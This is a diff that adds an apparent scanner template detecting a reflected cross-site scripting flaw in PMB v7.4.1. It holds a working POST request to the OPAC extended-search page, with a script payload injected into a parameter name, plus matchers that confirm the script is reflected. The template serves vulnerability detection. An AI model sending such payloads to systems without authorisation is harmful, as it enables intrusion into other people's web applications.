@@ -1,0 +1,39 @@
+id: pmb-xss
+brief:
+    title: PMB v7.4.1 - Cross Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: PMB v7.4.1 allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser via no_search parameter
+    label:
+        - xss
+        - pmb
+        - cms
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/pmb/opac_css/index.php?lvl=search_result&search_type_asked=extended_search'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: add_field=&search%5B%5D=f_1&op_0_f_1=EXACT&field_0_f_1%5B%5D=gang&explicit_search=1&search_xml_file=search_fields&delete_field=&launch_search=1&page=&no_search=0&ij6fm%22%3e%3cscript%3ealert(1337)%3c%2fscript%3evg9q6c4g1mk=1
+      signs:
+        - "on": word
+          has:
+            - <script>alert(1337)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - PMB Group
+            - pmbDojo
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
